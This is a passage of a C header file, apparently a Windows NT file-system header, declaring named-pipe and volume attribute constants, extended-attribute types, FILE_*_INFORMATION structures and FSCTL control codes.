#define FILE_PIPE_MESSAGE_MODE              0x00000001

#define FILE_PIPE_QUEUE_OPERATION           0x00000000
#define FILE_PIPE_COMPLETE_OPERATION        0x00000001

#define FILE_PIPE_INBOUND                   0x00000000
#define FILE_PIPE_OUTBOUND                  0x00000001
#define FILE_PIPE_FULL_DUPLEX               0x00000002

#define FILE_PIPE_DISCONNECTED_STATE        0x00000001
#define FILE_PIPE_LISTENING_STATE           0x00000002
#define FILE_PIPE_CONNECTED_STATE           0x00000003
#define FILE_PIPE_CLOSING_STATE             0x00000004

#define FILE_PIPE_CLIENT_END                0x00000000
#define FILE_PIPE_SERVER_END                0x00000001

#define FILE_CASE_SENSITIVE_SEARCH          0x00000001
#define FILE_CASE_PRESERVED_NAMES           0x00000002
#define FILE_UNICODE_ON_DISK                0x00000004
#define FILE_PERSISTENT_ACLS                0x00000008
#define FILE_FILE_COMPRESSION               0x00000010
#define FILE_VOLUME_QUOTAS                  0x00000020
#define FILE_SUPPORTS_SPARSE_FILES          0x00000040
#define FILE_SUPPORTS_REPARSE_POINTS        0x00000080
#define FILE_SUPPORTS_REMOTE_STORAGE        0x00000100
#define FILE_VOLUME_IS_COMPRESSED           0x00008000
#define FILE_SUPPORTS_OBJECT_IDS            0x00010000
#define FILE_SUPPORTS_ENCRYPTION            0x00020000
#define FILE_NAMED_STREAMS                  0x00040000
#define FILE_READ_ONLY_VOLUME               0x00080000
#define FILE_SEQUENTIAL_WRITE_ONCE          0x00100000
#define FILE_SUPPORTS_TRANSACTIONS          0x00200000
#define FILE_SUPPORTS_HARD_LINKS            0x00400000
#define FILE_SUPPORTS_EXTENDED_ATTRIBUTES   0x00800000
#define FILE_SUPPORTS_OPEN_BY_FILE_ID       0x01000000
#define FILE_SUPPORTS_USN_JOURNAL           0x02000000

#define FILE_NEED_EA                    0x00000080

#define FILE_EA_TYPE_BINARY             0xfffe
#define FILE_EA_TYPE_ASCII              0xfffd
#define FILE_EA_TYPE_BITMAP             0xfffb
#define FILE_EA_TYPE_METAFILE           0xfffa
#define FILE_EA_TYPE_ICON               0xfff9
#define FILE_EA_TYPE_EA                 0xffee
#define FILE_EA_TYPE_MVMT               0xffdf
#define FILE_EA_TYPE_MVST               0xffde
#define FILE_EA_TYPE_ASN1               0xffdd
#define FILE_EA_TYPE_FAMILY_IDS         0xff01

typedef struct _FILE_NOTIFY_INFORMATION {
  ULONG NextEntryOffset;
  ULONG Action;
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILE_NOTIFY_INFORMATION, *PFILE_NOTIFY_INFORMATION;

typedef struct _FILE_DIRECTORY_INFORMATION {
  ULONG NextEntryOffset;
  ULONG FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG FileAttributes;
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION {
  ULONG NextEntryOffset;
  ULONG FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG FileAttributes;
  ULONG FileNameLength;
  ULONG EaSize;
  WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION {
  ULONG NextEntryOffset;
  ULONG FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG FileAttributes;
  ULONG FileNameLength;
  ULONG EaSize;
  LARGE_INTEGER FileId;
  WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
  ULONG NextEntryOffset;
  ULONG FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG FileAttributes;
  ULONG FileNameLength;
  ULONG EaSize;
  CCHAR ShortNameLength;
  WCHAR ShortName[12];
  WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
  ULONG NextEntryOffset;
  ULONG FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG FileAttributes;
  ULONG FileNameLength;
  ULONG EaSize;
  CCHAR ShortNameLength;
  WCHAR ShortName[12];
  LARGE_INTEGER FileId;
  WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION {
  ULONG NextEntryOffset;
  ULONG FileIndex;
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

typedef struct _FILE_ID_GLOBAL_TX_DIR_INFORMATION {
  ULONG NextEntryOffset;
  ULONG FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG FileAttributes;
  ULONG FileNameLength;
  LARGE_INTEGER FileId;
  GUID LockingTransactionId;
  ULONG TxInfoFlags;
  WCHAR FileName[1];
} FILE_ID_GLOBAL_TX_DIR_INFORMATION, *PFILE_ID_GLOBAL_TX_DIR_INFORMATION;

#define FILE_ID_GLOBAL_TX_DIR_INFO_FLAG_WRITELOCKED         0x00000001
#define FILE_ID_GLOBAL_TX_DIR_INFO_FLAG_VISIBLE_TO_TX       0x00000002
#define FILE_ID_GLOBAL_TX_DIR_INFO_FLAG_VISIBLE_OUTSIDE_TX  0x00000004

typedef struct _FILE_OBJECTID_INFORMATION {
  LONGLONG FileReference;
  UCHAR ObjectId[16];
  _ANONYMOUS_UNION union {
    _ANONYMOUS_STRUCT struct {
      UCHAR BirthVolumeId[16];
      UCHAR BirthObjectId[16];
      UCHAR DomainId[16];
    } DUMMYSTRUCTNAME;
    UCHAR ExtendedInfo[48];
  } DUMMYUNIONNAME;
} FILE_OBJECTID_INFORMATION, *PFILE_OBJECTID_INFORMATION;

#define ANSI_DOS_STAR                   ('<')
#define ANSI_DOS_QM                     ('>')
#define ANSI_DOS_DOT                    ('"')

#define DOS_STAR                        (L'<')
#define DOS_QM                          (L'>')
#define DOS_DOT                         (L'"')

typedef struct _FILE_INTERNAL_INFORMATION {
  LARGE_INTEGER IndexNumber;
} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;

typedef struct _FILE_EA_INFORMATION {
  ULONG EaSize;
} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;

typedef struct _FILE_ACCESS_INFORMATION {
  ACCESS_MASK AccessFlags;
} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;

typedef struct _FILE_MODE_INFORMATION {
  ULONG Mode;
} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;

typedef struct _FILE_ALL_INFORMATION {
  FILE_BASIC_INFORMATION BasicInformation;
  FILE_STANDARD_INFORMATION StandardInformation;
  FILE_INTERNAL_INFORMATION InternalInformation;
  FILE_EA_INFORMATION EaInformation;
  FILE_ACCESS_INFORMATION AccessInformation;
  FILE_POSITION_INFORMATION PositionInformation;
  FILE_MODE_INFORMATION ModeInformation;
  FILE_ALIGNMENT_INFORMATION AlignmentInformation;
  FILE_NAME_INFORMATION NameInformation;
} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;

typedef struct _FILE_ALLOCATION_INFORMATION {
  LARGE_INTEGER AllocationSize;
} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;

typedef struct _FILE_COMPRESSION_INFORMATION {
  LARGE_INTEGER CompressedFileSize;
  USHORT CompressionFormat;
  UCHAR CompressionUnitShift;
  UCHAR ChunkShift;
  UCHAR ClusterShift;
  UCHAR Reserved[3];
} FILE_COMPRESSION_INFORMATION, *PFILE_COMPRESSION_INFORMATION;

typedef struct _FILE_LINK_INFORMATION {
  BOOLEAN ReplaceIfExists;
  HANDLE RootDirectory;
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;

typedef struct _FILE_MOVE_CLUSTER_INFORMATION {
  ULONG ClusterCount;
  HANDLE RootDirectory;
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILE_MOVE_CLUSTER_INFORMATION, *PFILE_MOVE_CLUSTER_INFORMATION;

typedef struct _FILE_RENAME_INFORMATION {
  BOOLEAN ReplaceIfExists;
  HANDLE RootDirectory;
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

typedef struct _FILE_STREAM_INFORMATION {
  ULONG NextEntryOffset;
  ULONG StreamNameLength;
  LARGE_INTEGER StreamSize;
  LARGE_INTEGER StreamAllocationSize;
  WCHAR StreamName[1];
} FILE_STREAM_INFORMATION, *PFILE_STREAM_INFORMATION;

typedef struct _FILE_TRACKING_INFORMATION {
  HANDLE DestinationFile;
  ULONG ObjectInformationLength;
  CHAR ObjectInformation[1];
} FILE_TRACKING_INFORMATION, *PFILE_TRACKING_INFORMATION;

typedef struct _FILE_COMPLETION_INFORMATION {
  HANDLE Port;
  PVOID Key;
} FILE_COMPLETION_INFORMATION, *PFILE_COMPLETION_INFORMATION;

typedef struct _FILE_PIPE_INFORMATION {
  ULONG ReadMode;
  ULONG CompletionMode;
} FILE_PIPE_INFORMATION, *PFILE_PIPE_INFORMATION;

typedef struct _FILE_PIPE_LOCAL_INFORMATION {
  ULONG NamedPipeType;
  ULONG NamedPipeConfiguration;
  ULONG MaximumInstances;
  ULONG CurrentInstances;
  ULONG InboundQuota;
  ULONG ReadDataAvailable;
  ULONG OutboundQuota;
  ULONG WriteQuotaAvailable;
  ULONG NamedPipeState;
  ULONG NamedPipeEnd;
} FILE_PIPE_LOCAL_INFORMATION, *PFILE_PIPE_LOCAL_INFORMATION;

typedef struct _FILE_PIPE_REMOTE_INFORMATION {
  LARGE_INTEGER CollectDataTime;
  ULONG MaximumCollectionCount;
} FILE_PIPE_REMOTE_INFORMATION, *PFILE_PIPE_REMOTE_INFORMATION;

typedef struct _FILE_MAILSLOT_QUERY_INFORMATION {
  ULONG MaximumMessageSize;
  ULONG MailslotQuota;
  ULONG NextMessageSize;
  ULONG MessagesAvailable;
  LARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_QUERY_INFORMATION, *PFILE_MAILSLOT_QUERY_INFORMATION;

typedef struct _FILE_MAILSLOT_SET_INFORMATION {
  PLARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_SET_INFORMATION, *PFILE_MAILSLOT_SET_INFORMATION;

typedef struct _FILE_REPARSE_POINT_INFORMATION {
  LONGLONG FileReference;
  ULONG Tag;
} FILE_REPARSE_POINT_INFORMATION, *PFILE_REPARSE_POINT_INFORMATION;

typedef struct _FILE_LINK_ENTRY_INFORMATION {
  ULONG NextEntryOffset;
  LONGLONG ParentFileId;
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILE_LINK_ENTRY_INFORMATION, *PFILE_LINK_ENTRY_INFORMATION;

typedef struct _FILE_LINKS_INFORMATION {
  ULONG BytesNeeded;
  ULONG EntriesReturned;
  FILE_LINK_ENTRY_INFORMATION Entry;
} FILE_LINKS_INFORMATION, *PFILE_LINKS_INFORMATION;

typedef struct _FILE_NETWORK_PHYSICAL_NAME_INFORMATION {
  ULONG FileNameLength;
  WCHAR FileName[1];
} FILE_NETWORK_PHYSICAL_NAME_INFORMATION, *PFILE_NETWORK_PHYSICAL_NAME_INFORMATION;

typedef struct _FILE_STANDARD_LINK_INFORMATION {
  ULONG NumberOfAccessibleLinks;
  ULONG TotalNumberOfLinks;
  BOOLEAN DeletePending;
  BOOLEAN Directory;
} FILE_STANDARD_LINK_INFORMATION, *PFILE_STANDARD_LINK_INFORMATION;

typedef struct _FILE_GET_EA_INFORMATION {
  ULONG NextEntryOffset;
  UCHAR EaNameLength;
  CHAR  EaName[1];
} FILE_GET_EA_INFORMATION, *PFILE_GET_EA_INFORMATION;

#define REMOTE_PROTOCOL_FLAG_LOOPBACK       0x00000001
#define REMOTE_PROTOCOL_FLAG_OFFLINE        0x00000002

typedef struct _FILE_REMOTE_PROTOCOL_INFORMATION {
  USHORT StructureVersion;
  USHORT StructureSize;
  ULONG  Protocol;
  USHORT ProtocolMajorVersion;
  USHORT ProtocolMinorVersion;
  USHORT ProtocolRevision;
  USHORT Reserved;
  ULONG  Flags;
  struct {
    ULONG Reserved[8];
  } GenericReserved;
  struct {
    ULONG Reserved[16];
  } ProtocolSpecificReserved;
} FILE_REMOTE_PROTOCOL_INFORMATION, *PFILE_REMOTE_PROTOCOL_INFORMATION;

typedef struct _FILE_GET_QUOTA_INFORMATION {
  ULONG NextEntryOffset;
  ULONG SidLength;
  SID Sid;
} FILE_GET_QUOTA_INFORMATION, *PFILE_GET_QUOTA_INFORMATION;

typedef struct _FILE_QUOTA_INFORMATION {
  ULONG NextEntryOffset;
  ULONG SidLength;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER QuotaUsed;
  LARGE_INTEGER QuotaThreshold;
  LARGE_INTEGER QuotaLimit;
  SID Sid;
} FILE_QUOTA_INFORMATION, *PFILE_QUOTA_INFORMATION;

typedef struct _FILE_FS_ATTRIBUTE_INFORMATION {
  ULONG FileSystemAttributes;
  ULONG MaximumComponentNameLength;
  ULONG FileSystemNameLength;
  WCHAR FileSystemName[1];
} FILE_FS_ATTRIBUTE_INFORMATION, *PFILE_FS_ATTRIBUTE_INFORMATION;

typedef struct _FILE_FS_DRIVER_PATH_INFORMATION {
  BOOLEAN DriverInPath;
  ULONG DriverNameLength;
  WCHAR DriverName[1];
} FILE_FS_DRIVER_PATH_INFORMATION, *PFILE_FS_DRIVER_PATH_INFORMATION;

typedef struct _FILE_FS_VOLUME_FLAGS_INFORMATION {
  ULONG Flags;
} FILE_FS_VOLUME_FLAGS_INFORMATION, *PFILE_FS_VOLUME_FLAGS_INFORMATION;

#define FILE_VC_QUOTA_NONE              0x00000000
#define FILE_VC_QUOTA_TRACK             0x00000001
#define FILE_VC_QUOTA_ENFORCE           0x00000002
#define FILE_VC_QUOTA_MASK              0x00000003
#define FILE_VC_CONTENT_INDEX_DISABLED  0x00000008
#define FILE_VC_LOG_QUOTA_THRESHOLD     0x00000010
#define FILE_VC_LOG_QUOTA_LIMIT         0x00000020
#define FILE_VC_LOG_VOLUME_THRESHOLD    0x00000040
#define FILE_VC_LOG_VOLUME_LIMIT        0x00000080
#define FILE_VC_QUOTAS_INCOMPLETE       0x00000100
#define FILE_VC_QUOTAS_REBUILDING       0x00000200
#define FILE_VC_VALID_MASK              0x000003ff

typedef struct _FILE_FS_CONTROL_INFORMATION {
  LARGE_INTEGER FreeSpaceStartFiltering;
  LARGE_INTEGER FreeSpaceThreshold;
  LARGE_INTEGER FreeSpaceStopFiltering;
  LARGE_INTEGER DefaultQuotaThreshold;
  LARGE_INTEGER DefaultQuotaLimit;
  ULONG FileSystemControlFlags;
} FILE_FS_CONTROL_INFORMATION, *PFILE_FS_CONTROL_INFORMATION;

#ifndef _FILESYSTEMFSCTL_
#define _FILESYSTEMFSCTL_

#define FSCTL_REQUEST_OPLOCK_LEVEL_1    CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  0, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_REQUEST_OPLOCK_LEVEL_2    CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  1, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_REQUEST_BATCH_OPLOCK      CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  2, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_OPLOCK_BREAK_ACKNOWLEDGE  CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  3, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_OPBATCH_ACK_CLOSE_PENDING CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  4, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_OPLOCK_BREAK_NOTIFY       CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  5, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_LOCK_VOLUME               CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  6, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_UNLOCK_VOLUME             CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  7, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DISMOUNT_VOLUME           CTL_CODE(FILE_DEVICE_FILE_SYSTEM,  8, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_IS_VOLUME_MOUNTED         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 10, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_IS_PATHNAME_VALID         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 11, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_MARK_VOLUME_DIRTY         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 12, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_QUERY_RETRIEVAL_POINTERS  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 14, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_GET_COMPRESSION           CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 15, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SET_COMPRESSION           CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 16, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define FSCTL_SET_BOOTLOADER_ACCESSED   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 19, METHOD_NEITHER,  FILE_ANY_ACCESS)

#define FSCTL_OPLOCK_BREAK_ACK_NO_2     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 20, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_INVALIDATE_VOLUMES        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 21, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_QUERY_FAT_BPB             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 22, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_REQUEST_FILTER_OPLOCK     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 23, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_FILESYSTEM_GET_STATISTICS CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 24, METHOD_BUFFERED, FILE_ANY_ACCESS)

#if (_WIN32_WINNT >= 0x0400)

#define FSCTL_GET_NTFS_VOLUME_DATA      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 25, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_GET_NTFS_FILE_RECORD      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 26, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_GET_VOLUME_BITMAP         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 27, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_GET_RETRIEVAL_POINTERS    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 28, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_MOVE_FILE                 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 29, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_IS_VOLUME_DIRTY           CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 30, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_ALLOW_EXTENDED_DASD_IO    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 32, METHOD_NEITHER,  FILE_ANY_ACCESS)

#endif

#if (_WIN32_WINNT >= 0x0500)

#define FSCTL_FIND_FILES_BY_SID         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 35, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_SET_OBJECT_ID             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 38, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_GET_OBJECT_ID             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 39, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DELETE_OBJECT_ID          CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 40, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_REPARSE_POINT         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 41, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_GET_REPARSE_POINT         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 42, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DELETE_REPARSE_POINT      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 43, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_ENUM_USN_DATA             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 44, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_SECURITY_ID_CHECK         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 45, METHOD_NEITHER,  FILE_READ_DATA)
#define FSCTL_READ_USN_JOURNAL          CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 46, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_SET_OBJECT_ID_EXTENDED    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 47, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_CREATE_OR_GET_OBJECT_ID   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 48, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SET_SPARSE                CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 49, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_ZERO_DATA             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 50, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_QUERY_ALLOCATED_RANGES    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 51, METHOD_NEITHER,  FILE_READ_DATA)
#define FSCTL_ENABLE_UPGRADE            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 52, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_SET_ENCRYPTION            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 53, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_ENCRYPTION_FSCTL_IO       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 54, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_WRITE_RAW_ENCRYPTED       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 55, METHOD_NEITHER,  FILE_SPECIAL_ACCESS)
#define FSCTL_READ_RAW_ENCRYPTED        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 56, METHOD_NEITHER,  FILE_SPECIAL_ACCESS)
#define FSCTL_CREATE_USN_JOURNAL        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 57, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_READ_FILE_USN_DATA        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 58, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_WRITE_USN_CLOSE_RECORD    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 59, METHOD_NEITHER,  FILE_ANY_ACCESS)
#define FSCTL_EXTEND_VOLUME             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 60, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_QUERY_USN_JOURNAL         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 61, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DELETE_USN_JOURNAL        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 62, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_MARK_HANDLE               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 63, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SIS_COPYFILE              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 64, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SIS_LINK_FILES            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 65, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define FSCTL_RECALL_FILE               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 69, METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_READ_FROM_PLEX            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 71, METHOD_OUT_DIRECT, FILE_READ_DATA)
#define FSCTL_FILE_PREFETCH             CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 72, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#endif

#if (_WIN32_WINNT >= 0x0600)

#define FSCTL_MAKE_MEDIA_COMPATIBLE         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 76, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_SET_DEFECT_MANAGEMENT         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 77, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_QUERY_SPARING_INFO            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 78, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_QUERY_ON_DISK_VOLUME_INFO     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 79, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_SET_VOLUME_COMPRESSION_STATE  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 80, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_TXFS_MODIFY_RM                CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 81, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_TXFS_QUERY_RM_INFORMATION     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 82, METHOD_BUFFERED, FILE_READ_DATA)
#define FSCTL_TXFS_ROLLFORWARD_REDO         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 84, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_TXFS_ROLLFORWARD_UNDO         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 85, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_TXFS_START_RM                 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 86, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_TXFS_SHUTDOWN_RM              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 87, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_TXFS_READ_BACKUP_INFORMATION  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 88, METHOD_BUFFERED, FILE_READ_DATA)
#define FSCTL_TXFS_WRITE_BACKUP_INFORMATION CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 89, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_TXFS_CREATE_SECONDARY_RM      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 90, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_TXFS_GET_METADATA_INFO        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 91, METHOD_BUFFERED, FILE_READ_DATA)
#define FSCTL_TXFS_GET_TRANSACTED_VERSION   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 92, METHOD_BUFFERED, FILE_READ_DATA)
#define FSCTL_TXFS_SAVEPOINT_INFORMATION    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 94, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_TXFS_CREATE_MINIVERSION       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 95, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_TXFS_TRANSACTION_ACTIVE       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 99, METHOD_BUFFERED, FILE_READ_DATA)
#define FSCTL_SET_ZERO_ON_DEALLOCATION      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 101, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_REPAIR                    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 102, METHOD_BUFFERED, FILE_ANY_ACCESS)
